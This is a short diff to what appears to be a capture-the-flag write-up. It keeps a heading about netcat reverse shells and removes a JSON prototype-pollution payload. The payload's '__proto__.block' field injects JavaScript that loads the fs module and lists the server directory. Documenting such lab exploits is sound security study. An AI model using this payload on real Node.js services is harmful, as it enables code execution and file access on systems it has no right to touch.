@@ -209,19 +209,3 @@ You can also get a reverse shell using netcat (OpenBSD)
 <img src="https://imgur.com/PXj0QUn.png"/>
 
 <img src="https://imgur.com/uQRWoFX.png"/>
-
-```
-{
-"song": 
-    { 
-        "name":"Not Polluting with the boys" 
-    }, 
-    "__proto__.block": 
-    {
-        "type": "Text",
-        "line": "'test'; return process.mainModule.constructor._load('fs').readdirSync('./', {encoding:'utf8', flag:'r'})",
-        "val": "ARZ"
-    } 
-}
-
-````
